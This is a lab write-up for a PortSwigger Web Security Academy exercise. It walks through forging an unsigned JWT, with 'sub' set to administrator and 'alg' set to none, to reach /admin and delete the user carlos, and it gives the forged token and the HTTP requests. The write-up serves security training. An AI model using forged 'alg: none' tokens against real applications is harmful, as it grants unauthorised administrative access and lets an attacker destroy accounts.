## JWT authentication bypass via flawed signature verification

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip :

We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.

## Notes

- /admin
- Search page
- Possibility to leave a comment on a post

## Resume

1. Log in as `wiener`.
2. Open the post-login `GET /my-account` request in Burp.
3. Edit the JWT payload so `sub` becomes `administrator`.
4. Change the JWT header `alg` value to `none`.
5. Remove the signature, but keep the trailing dot.
6. Send the request to access the admin panel.
7. Delete `carlos`.

## Solve

In the lab, log in to your own account.

In Burp, open the post-login `GET /my-account` request in the **Proxy > HTTP history** tab. Observe that the session cookie is a JWT.

Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the `sub` claim contains your username. Send this request to Burp Repeater.

Your original JWT looked like this:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a060042045cc6e6807ad00a002a0073.web-security-academy.net
Cookie: session=eyJraWQiOiI1NzRmZTcxOS1kYmEzLTQzYWQtYjA3YS1kYjU1MmQxZWRkNjciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1NTY5Mywic3ViIjoid2llbmVyIn0.qALlji6ZiVaGLOxVWpr0Y7He0F-FsH1gi0CFUIag4Q3zOj3ziNYszbOADZXQMrwyLXL5ssKK45x1vWyEPA29fc5U4nrSAErDKOy4mSpxMLv5ONLsTt3yKwt8hN7ZMez7iZV3VjDzuw3iLOSJKMLmrJrD04FI14A-H3ZyON71n6VHVf4pF-7Q8DC2o7gKTxp4LrkYHjGGNWODwqvYd6OZuDgZ4_s3dwEWQg-C2Slwrc5fKVr53my05F8O_XI0WtnCb6UgaX2PdfAFCqe4ujLFkJUTAsV5hbFZS5RhBcuAd7yrm3KfLqD0-VyP5Rpo0mk9d4h6Ktxb0dqyk_2Nq_os8A
```

Using the JWT Editor, update the payload to:

```json
{
  "iss": "portswigger",
  "exp": 1779955693,
  "sub": "administrator"
}
```

Then select the JWT header and change the `alg` parameter to `none`.

At this point, use **Attack** → **Sign with empty key** in the JWT Editor. This strips the signature and leaves the token in the correct unsigned format.

Your forged token should look like this:

```http
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1NTY5Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

Send the request to `/admin` and confirm that the admin panel is now accessible.

The admin page contains this HTML:

```html
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```

Finally, send this request to delete `carlos`:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a060042045cc6e6807ad00a002a0073.web-security-academy.net
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1NTY5Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

Send that request to solve the lab.